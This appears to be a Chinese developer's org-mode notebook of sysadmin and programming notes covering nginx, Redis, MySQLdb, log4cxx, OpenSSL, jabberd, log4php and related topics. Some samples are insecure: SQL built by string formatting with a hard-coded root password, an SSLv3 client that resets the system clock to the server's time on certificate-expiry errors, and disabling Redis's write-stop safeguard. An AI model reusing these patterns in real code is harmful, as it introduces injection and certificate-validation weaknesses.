   下面的是经过修改后的 =nginx image filter= 模块代码，加入居中的水印效果:

#+o_blog_source ./static/ngx_http_image_filter_module.c

**** 编译
     #+begin_src sh
     --with-debug --with-http_image_filter_module --add-module=/home/tangxinfa/Opensource/nginx-1.2.7/../ngx_http_qrcode_module/ --add-module=/home/tangxinfa/Opensource/nginx-1.2.7/../ngx_devel_kit/ --add-module=/home/tangxinfa/Opensource/nginx-1.2.7/../set-misc-nginx-module/ --add-module=/home/tangxinfa/Opensource/nginx-1.2.7/../echo-nginx-module/
     #+end_src

**** 配置
     #+begin_example
          location ~ /qr {
              qrcode_fg_color FF0000;
              qrcode_bg_color FFFFFF;    
              qrcode_level 2;
              qrcode_hint 2;
              qrcode_size 120;
              qrcode_margin 2;
              qrcode_version 5;
              set_unescape_uri $txt $arg_txt;
              qrcode_txt $txt;
              qrcode_casesensitive 1; 
              qrcode_gen;  

              image_filter_watermark "/usr/share/pixmaps/gnome-word.png";
              image_filter_watermark_transparency 95; #0-100
              image_filter watermark;
          }
     #+end_example

**** 访问
#+begin_example
   http://localhost:8080/qr?txt=hello
#+end_example
     - 显示效果：
     [[file:static/hello_qr.png]]

*** 二维码基础服务的一点思索
    - 必须建立在cdn的基础上
    - 用户只需按照约定将内容以及定制参数按照直观的方式编码成二维码图片链接即可

    参考：https://developers.google.com/chart/infographics/docs/qr_codes

** DONE 解决保存快照失败后redis无法写入的问题                         :redis:
   CLOSED: <2012-12-16 日 15:14>
   
   用命令行工具连上后执行“set test 0”出现以下错误提示：
   #+BEGIN_EXAMPLE
   MISCONF Redis is configured to save RDB snapshots, but is currently not able to persist on disk. Commands that may modify the data set are disabled. Please check Redis logs for details about the error.
   #+END_EXAMPLE
   这个应该是之前强制停止redis快照导致的，查看redis快照状态证实了这一点：
   #+BEGIN_EXAMPLE
   redis 127.0.0.1:6379> info
   ...
   rdb_last_bgsave_status:err
   ...
   #+END_EXAMPLE
   通过关闭配置项stop-writes-on-bgsave-error解决该问题。
   #+BEGIN_EXAMPLE
   redis 127.0.0.1:6379> config set stop-writes-on-bgsave-error no
   #+END_EXAMPLE

** DONE 使用hash表结构减少redis内存占用                               :redis:
   CLOSED: <2012-12-16 日 15:14>

   当hash结构中的元素较少（少于redis.conf:hash-max-zipmap-entries指定的数量时，配置成<=1000，过大会减低处理速度，参见： [[http://stackoverflow.com/questions/11281734/redis-using-hashes][这里]] 和 [[http://instagram-engineering.tumblr.com/post/12202313862/storing-hundreds-of-millions-of-simple-key-value-pairs][这里]] ）且数据为整型时，redis使用特殊的方式（数组保存，时间换空间）保存hash结构以减少内存占用，参见 [[http://redis.io/topics/memory-optimization][这里]] 和 [[http://stackoverflow.com/questions/9625246/what-are-the-underlying-data-structures-used-for-redis][这里]] 。但当hash结构超过指定数量时将使用普通的[[http://redis.io/commands#string][字符串]]方式保存，也就无法再节省内存了。

** DONE 估算redis内存占用                                             :redis:
   CLOSED: <2012-12-16 日 15:14>

   参考: [[http://lethain.com/notes-on-redis-memory-usage/][Notes on Redis Memory Usage]]

   - 测试环境
     - redis版本 :: redis\_version:2.4.4
     - 操作系统（uname -a） :: Linux CentOS 2.6.32-220.13.1.el6.x86\_64 #1 SMP Tue Apr 17 23:56:34 BST 2012 x86\_64 x86\_64 x86\_64 GNU/Linux
     - python版本（python --version） :: Python 2.6.6

*** Strings
    - 测试脚本
      #+BEGIN_SRC python
        #!/bin/env python
        
        import redis
        import uuid
        import time
        
        r = redis.Redis(host='localhost', port=6379, db=0)
        for num_strings in (100000,):
            r.flushall()
            time.sleep(1.0)
            initial_size = r.dbsize()
            initial_info = r.info()
        
            for i in xrange(0, num_strings):
                r.set(str(uuid.uuid4()), time.time())
                #r.setex(str(uuid.uuid4()), time.time(), 100000)
            final_size = r.dbsize()
            final_info = r.info()
        
            print "For %s strings." % (num_strings,)
            print "Keys: %s => %s" % (initial_size, final_size)
            print "Memory: %s => %s" % (initial_info['used_memory'],
                                            final_info['used_memory'])
            print "Memory per key: %d"%((int(final_info['used_memory']) - int(initial_info['used_memory'])) / num_strings)
        #+END_SRC
    - 测试结果
      - set :: 每个key-value占用138字节，可见redis本身的维护开销为89字节
      - setex :: 每个key-value占用180字节，可见redis本身的维护开销为131字节，启用过期时间需要42字节开销（这是因为redis使用新的链表保存设置了过期时间的条目）。

*** Sets
    - 测试脚本
      #+BEGIN_SRC python
        #!/bin/env python
        
        import redis
        import math
        import time
        
        r = redis.Redis(host='localhost', port=6379, db=0)
        set_capcity = int(r.config_get("set-max-intset-entries")["set-max-intset-entries"])
        
        def set_name(i, num_strings, set_capcity):
            set_num = math.ceil(num_strings/float(set_capcity))
            return "s%d"%(i%set_num)
            
        for num_strings in (100000,):
            r.flushall()
            time.sleep(1.0)
            initial_size = r.dbsize()
            initial_info = r.info()
        
            for i in xrange(0, num_strings):
                #r.sadd("s", str(i))
                r.sadd(set_name(i, num_strings, set_capcity), str(i))
            final_size = r.dbsize()
            final_info = r.info()
        
            print "For %s strings." % (num_strings,)
            print "Keys: %s => %s" % (initial_size, final_size)
            print "Memory: %s => %s" % (initial_info['used_memory'],
                                            final_info['used_memory'])
            print "Memory per key: %d"%((int(final_info['used_memory']) - int(initial_info['used_memory'])) / num_strings)
        
        #+END_SRC

    - 测试结果
      - 启用压缩 :: 每个value占用4字节
      - 不启用压缩 :: 每个value占用39字节
      注意: redis的set仅当值为整型，压缩才会生效。

*** 内存预留
    除非你能够保证你的机器总是有一半的空闲内存，否则别使用快照方式持久化数据或者通过执行BGREWRITEAOF压缩aof文件。
    redis在执行bgsave时，会进行一次fork，fork后的进程负责将内存中的数据写入磁盘，由于fork采用Copy-On-Write，两个redis进程共享内存中的数据。redis如果有数据更新，则会将对应的共享内存页创建一份副本再更新，当更新操作足够频繁时，共享的内存空间会迅速地副本化，导致物理内存被耗光，系统被迫动用交换空间，从而导致redis服务极不稳定，整个系统堵塞在磁盘io上。

** DONE linux下跨进程传递文件描述符                                   :linux:
   CLOSED: <2013-03-09 六 15:11>

*** 问题
    在web开发中，以典型的php-fpm为例，对于到外部系统的连接（如：mysql、redis）等都提供了持久连接接口（pconnect），但是受限于多进程模型，事实上是每个php-fpm进程都有单独的一个连接池的（参见：《[[file:php_meet_redis.org][当php遇上redis]]》），大量空闲连接的存在不仅对系统资源造成了浪费（不单指fd空间，像mysql的每连接一线程会附带大量内存空间：sort\_buffer、read\_buffer等），而且整个系统将无法横向扩展（如：mysql连接数限制）。如果可以在进程间共享文件描述符，将可以大大提升系统性能，促进多进程模型的应用。

*** 方案
    在linux平台下，sendmsg、recvmsg可以将一个进程的文件描述符传递给另一进程使用，这使得实现系统级的连接池成为可能。

*** 实现
    《The Linux Programming Interface》61.13.3 Passing File Descriptors
     
** DONE Web模型初探                                                     :web:
   CLOSED: <2013-02-28 四 15:07>

*** CGI

    全称为Common Gateway Interface，即公共网关接口。
    当Web服务器收到一个请求时，运行相应的处理程序，相关参数通过标准输入传递给处理程序，处理程序的标准输出做为响应内容，处理程序运行结束后将响应发送给客户端。
    
    - 性能 *

      进程级，每请求一进程。进程创建有很大的开销，并发数与系统资源消耗呈线性增长，有限的系统资源成为瓶颈。
      
*** FastCGI

    为CGI的改良，CGI程序做为独立的网络后台程序运行，当Web服务器收到一个请求时，发起一个tcp请求到处理程序，通过该tcp连接传入相关参数，处理程序的响应也通过该tcp连接发回给Web服务器，处理程序关闭该连接表示处理完毕，Web服务器最终将响应发送给客户端。

    - 性能 **

      网络级，每请求一连接。CGI的改良，重用进程，进程处理完一个请求后再处理下一请求，对于多个请求，只需要付出一次进程创建的开销，可以在后继请求重用资源（从文件载入的配置项、查询到的数据、打开的文件、数据库连接等）。因为处理程序是串行处理请求，往往需要同时运行多个处理程序以提升并发处理能力，这些处理程序无法共享资源以进一步提升性能。
    
    - 附录

      Web服务器可重用到服务程序的连接进一步提升性能（如：nginx的[[http://nginx.org/en/docs/http/ngx_http_upstream_module.html#keepalive][upstream\_keepalive]]）。
      
*** WSGI

*** uWSGI

** DONE memcached_get会重置过期时间吗？                           :memcached:
   CLOSED: <2012-11-13 二 20:29>

   不会。获取数据的操作不会影响数据的过期时间，最新的memcache1.6添加了touch和GAT（get and touch)命令，可以在获取数据时过期时间。
** DONE python中MySQLdb使用utf-8字符集                         :python:mysql:
   CLOSED: <2011-04-29 Fri 01:22>

   - 要避免乱码需要做好以下几点 ::
     - python源代码保存为utf-8
     - 数据库建成utf-8
     - mysql连接设置为utf-8
     - 查询結果中的文本字段是unicode的，转回utf-8

   - 总结性的示例代码 ::
     #+begin_src python
       #!/usr/bin/env python
       #-*- coding: utf-8 -*-
       
       import MySQLdb
       
       if __name__ == '__main__':
           mysql = MySQLdb.connect(host='localhost', user='root', passwd='123456', charset='utf8')
           cursor = mysql.cursor()
           cursor.execute('SET NAMES UTF8')
           sql = 'DROP DATABASE IF EXISTS mysqldb_utf8_test'
           cursor.execute(sql)
           sql = 'CREATE DATABASE mysqldb_utf8_test DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci'
           cursor.execute(sql)
           mysql = MySQLdb.connect(host='localhost', user='root', passwd='123456', db='mysqldb_utf8_test', charset='utf8')
           cursor = mysql.cursor()
           cursor.execute('SET NAMES UTF8')
           sql = 'CREATE TABLE utf8_table(key_field VARCHAR(32) NOT NULL, value_field VARCHAR(255) NOT NULL)'
           cursor.execute(sql)
           key = 'tangxinfa'
           value = '好人一个'
           sql = 'INSERT INTO utf8_table VALUES("%s", "%s")'%(key, value)
           cursor.execute(sql)       #注意某些旧版本的mysql（如4.1.22以下），mysql.character_set_name()总是返回latin1，会引起乱码，需要改为cursor.execute('INSERT INTO utf8_table VALUES("%s", "%s")', (key, value))
           sql = 'select * from utf8_table'
           cursor.execute(sql)
           for record in cursor.fetchall():
               for item in record:
                   print item.encode('utf8')
     #+end_src

   - 参考 ::
     - http://mysql-python.sourceforge.net/MySQLdb.html
     - http://bbs.phpchina.com/viewthread.php?tid=13861
     - http://hi.baidu.com/ak456/blog/item/c318502394aa20569922ed7b.html

** DONE log4cxx使用心得                                             :log4cxx:
   CLOSED: <2008-06-17 Tue 10:01>

   - 简介

     apache出品必属精品。正宗c++日志库，与log4j一脉相承。

     http://logging.apache.org/log4cxx/index.html

   - 下载、编译、安装

     打算安装到${HOME}/libs目录下：

     #+begin_src sh
     cd ~/libs
     wget http://mirror.bjtu.edu.cn/apache//apr/apr-1.4.4.tar.bz2
     tar xjvf apr-1.4.4.tar.bz2
     cd apr-1.4.4
     ./configure --prefix=${HOME}/libs && make && make install
     cd ..
     wget http://mirror.bjtu.edu.cn/apache//apr/apr-util-1.3.11.tar.bz2
     tar xjvf apr-util-1.3.11.tar.bz2
     cd apr-util-1.3.11
     ./configure --prefix=${HOME}/libs --with-apr=${HOME}/libs && make && make install
     cd ..
     wget http://apache.etoak.com//logging/log4cxx/0.10.0/apache-log4cxx-0.10.0.tar.gz
     tar xzvf apache-log4cxx-0.10.0.tar.gz
     cd apache-log4cxx-0.10.0
     ./configure --with-charset=utf-8 --prefix=${HOME}/libs --with-apr=${HOME}/libs --with-apr-util=${HOME}/libs && make && make install
     #+end_src

   - 使用例子

     =hello.cpp= ：
     #+begin_src cpp
       #include "log4cxx/logger.h"
       #include "log4cxx/propertyconfigurator.h"
       
       static log4cxx::LoggerPtr logger(log4cxx::Logger::getLogger("hello"));
       
       int main(int argc, char *argv[])
       {
         log4cxx::PropertyConfigurator::configure("./log4cxx_hello.properties");
         LOG4CXX_INFO(logger, "你好，log4cxx!");
         return 0;
       }
     #+end_src
   
     =log4cxx_hello.properties= ：
     #+begin_example
       log4j.rootLogger=debug, R
       
       log4j.appender.stdout=org.apache.log4j.ConsoleAppender
       log4j.appender.stdout.layout=org.apache.log4j.PatternLayout
       
       # Pattern to output the caller's file name and line number.
       log4j.appender.stdout.layout.ConversionPattern=%5p [%t] (%F:%L) - %m%n
       
       log4j.appender.R=org.apache.log4j.RollingFileAppender
       log4j.appender.R.File=./hello.log
       
       log4j.appender.R.MaxFileSize=100KB
       # Keep one backup file
       log4j.appender.R.MaxBackupIndex=10
       
       log4j.appender.R.layout=org.apache.log4j.PatternLayout
       log4j.appender.R.layout.ConversionPattern=%5p %c [%t] (%F:%L) - %m%n
     #+end_example

     编译：
     #+begin_src sh
       g++ -o hello hello.cpp -I${HOME}/libs/include ${HOME}/libs/lib/liblog4cxx.a ${HOME}/libs/lib/libaprutil-1.a ${HOME}/libs/lib/libapr-1.a  -lexpat -lpthread
     #+end_src

   - 注意事项

     由于一个日志文件写满后会重命名所有已有的日志文件，配置过大MaxBackupIndex的会有性能问题，因此log4cxx编译时限制了它的大小（大概十多个）以避免配置的MaxBackupIndex过大，如果要设置更大一点的MaxFileSize来保存更多日志，需要在编译前进行修改。

     参考：http://objectmix.com/apache/684503-urgent-log4cxx-large-window-sizes-not-allowed.html

   - 使用技巧
     - 决定配置文件的格式（xml，property）。以使用相应的配置器（Configurator）装入配置文件。

       xml虽较property格式繁锁，支持的配置面更全，而property格式的配置文件使用更简单，容易在网上找到现成的配置文件。

     - logger命名

       logger名称反映了软件模块，如果有代表软件模块的类，则在类中包含以该类类名命名的logger对象，该模块功能相关代码通过该logger进行日志记录。
       另外可将logger对象作为全局变量，方便使用，特别是当软件模块较松散，并无对应的封装类时。

     - 在代码中适当地放置日志代码。引用适当的日志对象，对日志进行适当分级。

     - 余下的工作就是修改配置文件，对日志进行控制了。

   　　使用配置文件的好处就是可以方便地配置日志而不需要修改源代码，可以在配置文件中方便配置日志过滤、格式、日志目的地。

   - 体验

   　之前产品中用到的是log4cplus，但是常常有写日志崩溃的情况出现，使用log4cxx正是用于解决该崩溃。
** DONE SSL双方系统时间不一致导致的SSL连接失败及其解决方案        :openssl:c:
   CLOSED: <2008-07-25 五 17:45>

   在产品使用中，实施人员常常报告服务器与客户端无法连接，最终查明原因是双方的时间设置不一致。OpenSSL证书有一个有效时间段，当客户端或服务器的系统时间不在这个时间段内时SSL会因证书验证失败而无法连接。在实施中系统时间错误是很常见的，因不能上网而未开时间自动同步、bios没电了、客户疏忽等原因都会导致系统时间设置错误。如果连接失败后再查看系统时间设置进行故障排查终归是一件麻烦的事情。

   解决这个问题有以下几个办法：

   - 将证书的有效期设置得够大（如：1970-2099）
     
     这样估计可以在一定程度上解决这个问题，不过这也是个馊主意，一般申请的证书总会有一个合理的有效期。

   - 检测及必要时自动同步客户端与服务器的时间
     
     通过用wireshake抓包分析SSL建立连接的过程，发现在SSL握手过程中，会向对方传送本机的系统时间。因此一个显而易见的办法就是，当连接过程中检测到证书过期，将客户端的时间同步为服务器端的时间，再重连即可。

     下面是具体的示例代码：
     #+begin_src c
       #include <openssl/ssl.h>
       #include <openssl/bio.h>
       #include <openssl/err.h>
       #include <winsock2.h>
       #include <stdio.h>
       #include <string.h>
       #include <time.h>
       
       typedef struct _TimeInfo
       {
           time_t client;  /*客户端的时间*/
           time_t server;  /*服务器的时间*/
       } TimeInfo;
       
       /**
        * 同步系统时间.
        */
       BOOL syncSystemTime(time_t t)
       {
           SYSTEMTIME st;
           FILETIME   ft;  
           LONGLONG   ll;  
           
           ll = Int32x32To64(t, 10000000) + 116444736000000000; //1970.01.01  
           
           ft.dwLowDateTime  = (DWORD)ll;  
           ft.dwHighDateTime = (DWORD)(ll >> 32);  
           
           return FileTimeToSystemTime(&ft, &st) && SetSystemTime(&st);
       }
       
       /**
        * 获取SSL握手过程中服务器与客户端双方的系统时间.
        */
       void getSSLHandleShakeTimeInfo(int write_p,
                                      int version,
                                      int content_type,
                                      const unsigned char* buf,
                                      size_t len,
                                      SSL *ssl,
                                      TimeInfo *ti)
       {
           if(content_type != 22)   //require handshake message
               return;
           if(len < 42)
               return;
           if(buf[0] == 1)          //ClientHello Message send from client to server
               ti->client = htonl(*((u_long*)(buf + 6)));
           else if(buf[0] == 2)     //ServerHello Message send from server to client
               ti->server = htonl(*((u_long*)(buf + 6)));
           else
               return;
       }
       
       int main()
       {
           BIO * bio;
           SSL * ssl;
           SSL_CTX * ctx;
           TimeInfo timeInfo = {-1, -1};
           BOOL timeSynced = FALSE;
           long result;
       
           /* Set up the library */
           SSL_library_init();
           ERR_load_BIO_strings();
           SSL_load_error_strings();
       
           /* Set up the SSL context */
           ctx = SSL_CTX_new(SSLv3_client_method());
           if(ctx == NULL)
           {
               fprintf(stderr, "Error new SSL_CTX\n");
               ERR_print_errors_fp(stderr);
               SSL_CTX_free(ctx);
               return 0;
           }
       
           /* Get Server and Client system time via SSL Handshake */
           SSL_CTX_set_msg_callback(ctx, getSSLHandleShakeTimeInfo);
           SSL_CTX_set_msg_callback_arg(ctx, &timeInfo);
           
           /* Load the trust store */
           if(! SSL_CTX_load_verify_locations(ctx, ".\\certs\\cacert.pem", NULL))
           {
               fprintf(stderr, "Error loading trust store\n");
               ERR_print_errors_fp(stderr);
               SSL_CTX_free(ctx);
               return 0;
           }
       
           /* Setup the connection */
           bio = BIO_new_ssl_connect(ctx);
       
           /* Set the SSL_MODE_AUTO_RETRY flag */
           BIO_get_ssl(bio, & ssl);
           SSL_set_mode(ssl, SSL_MODE_AUTO_RETRY);
       
           /* Create and setup the connection */
           BIO_set_conn_hostname(bio, "192.168.1.5:5555");
           if(BIO_do_connect(bio) <= 0)
           {
               fprintf(stderr, "Error attempting to connect\n");
               ERR_print_errors_fp(stderr);
               BIO_free_all(bio);
               SSL_CTX_free(ctx);
               return 0;
           }
           
           /* Check the certificate */
           switch(SSL_get_verify_result(ssl))
           {
           case X509_V_OK:
               break;
           case X509_V_ERR_CERT_NOT_YET_VALID:
           case X509_V_ERR_CERT_HAS_EXPIRED:
               if(timeInfo.server != -1 && timeInfo.client != -1)
               {
                   printf("当前客户端时间: %s", ctime(&timeInfo.client));
                   printf("当前服务器时间: %s", ctime(&timeInfo.server));
                   printf("尝试与服务器时间同步");
                   
                   if(syncSystemTime(timeInfo.server))
                       printf("成功\n");
                   else
                       printf("失败\n");
                   printf("请重试连接服务器！\n");
               }
           default:
               fprintf(stderr, "Certificate verification error: %i\n", SSL_get_verify_result(ssl));
               BIO_free_all(bio);
               SSL_CTX_free(ctx);
               return 0;
           }
       
           /* Close the connection and free the context */
           BIO_free_all(bio);
           SSL_CTX_free(ctx);
           return 0;
       }
     #+end_src
** DONE 搭建jabber服务器                                       :jabber:linux:
   CLOSED: <2011-05-04 三 00:32>

   - 编译安装
     
     =下载=
     #+begin_src sh
       wget http://download.jabberd.org/jabberd14/jabberd14-1.6.1.1.tar.gz
       tar xzvf jabberd14-1.6.1.1.tar.gz
       cd jabberd14-1.6.1.1
     #+end_src

     =修改代码以解决编译错误=
     #+begin_src sh
       diff -r jabberd14-1.6.1.1/jabberd/lib/xmlnode.cc tmp/jabberd14-1.6.1.1/jabberd/lib/xmlnode.cc
       882,884c882,884
       <     const char *next_step = NULL;
       <     const char *start_predicate = NULL;
       <     const char *end_predicate = NULL;
       ---
       >     char *next_step = NULL;
       >     char *start_predicate = NULL;
       >     char *end_predicate = NULL;
       1836c1836
       <         ((char*)strchr(lang, '-'))[0] = 0;
       ---
       >         strchr(lang, '-')[0] = 0;
       diff -r jabberd14-1.6.1.1/jabberd/log.cc tmp/jabberd14-1.6.1.1/jabberd/log.cc
       89c89
       <         pos = (char*)strchr(zone,'.');
       ---
       >     pos = strchr(zone,'.');
       diff -r jabberd14-1.6.1.1/jabberd/mio_tls.cc tmp/jabberd14-1.6.1.1/jabberd/mio_tls.cc
       615c615
       <         ret = gnutls_certificate_set_openpgp_key_file(current_credentials, pubfile, privfile, GNUTLS_OPENPGP_FMT_BASE64);
       ---
       >         ret = gnutls_certificate_set_openpgp_key_file(current_credentials, pubfile, privfile);
       634c634
       <         ret = gnutls_certificate_set_openpgp_keyring_file(current_credentials, file, GNUTLS_OPENPGP_FMT_BASE64);
       ---
       >         ret = gnutls_certificate_set_openpgp_keyring_file(current_credentials, file);
       640a641,657
       >     }
       >
       >     // load GnuPG trustdb
       >     if (j_strcmp(xmlnode_get_localname(cur), "trustdb") == 0) {
       >         char const *const file = xmlnode_get_data(cur);
       >
       >         if (file == NULL) {
       >         log_warn(NULL, "Initializing TLS subsystem: <trustdb/> element inside the TLS configuration, that does not contain a file-name.");
       >         continue;
       >         }
       >
       >         // load the GnuPG trustdb
       >         ret = gnutls_certificate_set_openpgp_trustdb(current_credentials, file);
       >         if (ret < 0) {
       >         log_error(NULL, "Error loading GnuPG trustdb %s: %s", file, gnutls_strerror(ret));
       >         continue;
       >         }
     #+end_src
     
     =编译安装=
     #+begin_src sh
       ./configure && make && sudo make install
     #+end_src

     如出错通常是少了相关依赖库，用包管理工具（如：ubuntu下的新立得）安装即可。

   - 配置

     按照mysql.sql中的注释配置数据库：
     
     #+begin_src sh
       mysql -uroot -p
       mysql> CREATE DATABASE jabber CHARACTER SET utf8;
       mysql> use jabber;
       mysql> grant all on jabber.* to jabber@localhost identified by 'secret';
       mysql> \. mysql.sql
     #+end_src

   - 运行

     #+begin_src sh
       sudo jabberd -h localhost -B
     #+end_src

   - 注册用户1

     #+begin_src sh
       telnet localhost 5222
       <stream:stream
         to='localhost'
         xmlns='jabber:client'
         xmlns:stream='http://etherx.jabber.org/streams'>
       
       <iq id='reg1' type='set'>
         <query xmlns='jabber:iq:register'>
           <username>jack</username>
           <password>jack</password>
           <name>jack</name>
           <email></email>
         </query>
       </iq>
       
       </stream:stream>
     #+end_src
   
   - 登录用户1

     #+begin_example
       Empathy菜单->编辑->帐户->添加：
       协议: Jabber
       登录ID: jack@localhost
       记住密码
       密码: jack
       登录
     #+end_example

   - 注册用户2
     
     #+begin_src sh
       telnet localhost 5222
       <stream:stream
         to='localhost'
         xmlns='jabber:client'
         xmlns:stream='http://etherx.jabber.org/streams'>
       
       <iq id='reg1' type='set'>
         <query xmlns='jabber:iq:register'>
           <username>rose</username>
           <password>rose</password>
           <name>rose</name>
           <email></email>
         </query>
       </iq>
       
       </stream:stream>
     #+end_src

   - 用户1加用户2为联系人
     
     #+begin_example
       Empathy菜单->聊天->添加联系人:
       帐户：jack@localhost
       标识符: rose@localhost
       添加
     #+end_example

   - 登录用户2，并发一个消息给用户1

     #+begin_src sh
       telnet localhost 5222
       <stream:stream
         to='localhost'
         xmlns='jabber:client'
         xmlns:stream='http://etherx.jabber.org/streams'>
       
       <iq id='auth1' type='set'>
         <query xmlns='jabber:iq:auth'>
           <username>rose</username>
           <password>rose</password>
           <resource>test</resource>
         </query>
       </iq>
       
       <presence/>
       
       <message to='jack@localhost'>
         <body>hello, jack</body>
       </message>
       
       </stream:stream>
     #+end_src
** TODO Node.js学习                                                 :node:
   
*** 适用范围
    
    - 引用[[http://nodejs.org/docs/latest/][原文]] ::

      #begin_example
        Node.js is a platform built on Chrome's JavaScript runtime for easily building fast, scalable network applications. Node.js uses an event-driven, non-blocking I/O model that makes it lightweight and efficient, perfect for data-intensive real-time applications that run across distributed devices.
      #end_example
    
    - 可以归结如下 ::

      - 较低的资源消耗处理海量网络请求
      - 开发分布式的数据密集型实时应用

*** 参考资源
    
    - [[http://www.nodebeginner.org/index-zh-cn.html][Node入门]] ::

      从Hello World到图片上传示例演示了如何以正确的方式开发[[http://nodejs.org][Node.js]]应用。
    
    - [[http://nodejs.org/docs/latest/api/all.html][Node.js官方API手册]]

** DONE log4php初步使用                                             :log4php:
   CLOSED: [2013-05-06 一 18:32]
   
*** 简介
    apache出品必属精品。正宗php日志库，与log4j一脉相承。

    [[http://logging.apache.org/log4php/]]

*** 安装
    参考：[[http://logging.apache.org/log4php/install.html]]

    - 有root权限，安装到系统目录

      #+begin_src sh
        sudo apt-get install php-pear
        sudo pear channel-discover pear.apache.org/log4php
        sudo pear install log4php/Apache_log4php
      #+end_src

    - 没有root权限，安装到当前目录下
       
      #+begin_src sh
        cd libs
        wget http://mirrors.tuna.tsinghua.edu.cn/apache/logging/log4php/2.3.0/apache-log4php-2.3.0-src.tar.gz
        tar xzvf apache-log4php-2.3.0-src.tar.gz
        ln -sf apache-log4php-2.3.0/src/main/php ./log4php
      #+end_src

*** 使用
    
    - 进行一下封装定制，可以满足绝大部分情况下的使用

      - 类似nginx的访问日志记录格式
      - 日志中输出文件名及行号
      - 日志文件数据限制为10个，每个日志文件大小为10MB

#+o_blog_source ./static/logging.inc

    - 使用示例

      =example.php=
      #+begin_src php
        <?php
        define('LOGGING_APPNAME', 'example');
        require_once(dirname(__FILE__) . "/logging.inc");
        
        $logger = Logger::getLogger("main");
        $logger->debug("info log");
        $logger->warn("info log");
        $logger->error("info log");
        ?>
      #+end_src

    - 运行结果

      #+begin_src sh
        $ php ./example.php
        $ tail -f ./logs/example.log
        2013-05-06 18:24:57,925 [DEBUG] main: info log (/home/tangxinfa/php/example.php:6)
        2013-05-06 18:24:57,930 [WARN] main: info log (/home/tangxinfa/php/example.php:7)
        2013-05-06 18:24:57,930 [ERROR] main: info log (/home/tangxinfa/php/example.php:8)
      #+end_src

** TODO 使用boost.coroutine异步访问mysql                          :cpp:mysql:
   
   开发高性能、高并发后台服务时，访问mysql总是一件头疼的事情，这绝对算是整个系统中最伤性能的部分，访问mysql总是很慢的，并且连接数受限，阻碍了开发高性能可线性扩展的后台服务。这也导致了像memcache、redis之类的NoSQL数据库的流行。

   但是，到目前为止mysql在可靠存储数据方面仍无法替代，NoSQL一般也仅用于做为mysql的缓存层，以减轻mysql的压力，所以探究一下如何更高效地访问mysql还是很有必要的。
   
   提高访问mysql效率的常见方法是异步化：用独立的数据库访问线程来执行数据库操作，在执行完成后通知应用逻辑进行后继处理，这种程序往往主程序是一个事件循环，而应用逻辑被切分成一个个回调函数，导致程序流程变得更加复杂，不易理解也容易滋生问题。

   接下来我打算使用协程来异步访问mysql，协程（[[http://www.boost.org/doc/libs/release/libs/coroutine/][boost.coroutine]]）可以让我们线性的书写处理逻辑，而不必引入复杂的状态机。

** TODO 深入理解Ember.js                                           :ember.js:
   
*** Ember.js的组件层次

    从下往上依次为：
    - 模板（templates）
      使用Handlebars模板语言描述用户界面，除了纯html还包含以下组件：
      - 表达式。{{firstName}}，以html来展示控制器和模型的信息，并保持同步。
      - 插座。{{outlet}}，路由根据应用当前所处的位置将对应的模板插入到相应的插座中。
      - 视图。{{view}}，将原始的用户事件（如：点击）转化为语义事件（如：增、删、改)并发送到控制器。
    - 控制器（controller）
      保存应用状态的对象。通常用于将模型进行进一步包装后暴露给模板。
    - 模型（model）
      保存持久状态的对象。通常从服务器端装入并最终会保存回去。
    - 路由（router）
      管理应用状态的对象。根据当前的url显示相应的模板，以及为模板指定配对的模型。
** DONE 《理解Http与Spdy协议》培训课件                            :http:spdy:
   CLOSED: [2013-05-23 四 13:11]
   
   本课件针对刚入职的毕业生，讲解Http与Spdy协议的基础知识。

*** 开发计划 [1/5]
    - [X] 编写Http部分大纲
    - [ ] 编写Http部分章节内容
    - [ ] 编写Spdy部分大纲
    - [ ] 编写Spdy部分章节内容
    - [ ] 制作Microsoft PowerPoint格式文档
   
*** 在线演示
    [[http://blog.kankanan.com/slides/理解Http与Spdy协议.html][《理解Http与Spdy协议》]]

** TODO 开源MQ（Message Queue）调研                                      :MQ:
   
*** ZeroMQ
    
    - 语言 :: c++
    - 协议 :: ZMQP
    - 定位 :: 类似于POSIX message queue，在socket之上搭建的IPC（机制），它不是消息中间件，由于其库的本质，速度上比MQ中间件快了一个数量级。
    - 总结 :: 和其它的MQ中间件没有可比性，在不需要持久化、稳定性、追求极致性能、易部署的情况下可以考虑使用，或根据情况同时使用其它的MQ服务。

*** RabbitMQ

    - 语言 :: Erlang
    - 协议 :: AMQP
    - 定位 :: 消息中间件
    - 总结 :: 应该是性能最好的开源消息中间件，在需要保证消息不丢失的情况下，可以考虑采用。像mysql一样需要启动服务，有各种语言的客户端库（一般使用不会去定制服务端的代码，大可不必介意自已是否熟悉Erlang语言）。

** TODO Hash、Bitmap和BloomFilter算法           :hash:algorithms:bitmap:bloomfilter:

   Hash、Bitmap和BloomFilter都可用于判断某个元素是否在集合中。

   参考：[[http://blog.csdn.net/jiaomeng/article/details/1496329][从哈希存储到Bloom Filter]]

*** Hash
    
    - 原理
      准备好哈希空间（足够保存集合中的所有元素），对于每个元素通过哈希函数求出其在哈希空间保存的位置，由于两个不同元素可能被哈希函数映射到同一哈希空间位置（碰撞、冲突），
      这需要进行一次解冲突，通常使用冲突链解决：获取哈希空间映射位置已存在的元素，如果元素值与当前元素不等，则挂在该哈希空间的冲突链中，图示如下：

      #+begin_src artist
        
        hash space 
        +-------------------------------------------------------------------+
        |     key1   key2   key3   key4   key5   key6                     --+--> hash keys
        |   +------+------+------+------+------+------+-----------------+   |        
        |   | val1 | val2 | val3 | val4 | val5 | val6 |  ...            | --+--> element values
        |   |   |  | NULL | NULL | NULL | NULL | NULL |                 | --+--> collision link head 
        |   +---+--+------+------+------+------+------+-----------------+   |                       
        |       |                                                           |                    
        |   +---+--+                                                        |                    
        |   |val1.1| -------------------------------------------------------+--> collision element values
        |   | NULL | -------------------------------------------------------+--> collision link pointer
        |   +------+                                                        |
        +-------------------------------------------------------------------+
        
      #+end_src
      
    - 特点

      - 0误差 :: 判断结果100%可信
      - 空间浪费 :: 由于哈希函数不可能做到没有冲突，所以哈希空间必然大于元素集合空间
      - 需要有好的哈希函数 :: 当哈希不均匀时，会导致一些哈希位置冲突链过长，访问这个哈希位置时算法复杂度由哈希表（O(1)）退化成链表（O(n)）。

*** Bitmap
    
    - 原理
      准备好位图空间（足够保存集合中的所有元素的位数），对于每个元素通过哈希函数求出其在位图空间占用的位，位置为1表示元素存在，由于位图空间没有保存元素值，因此无法检测哈希冲突。

    - 特点
      
      - 有误差 :: 仅能给出元素一定不在集合内以及元素可能在集合内的判断。当哈希函数能做到完全均匀才能达到0误差。
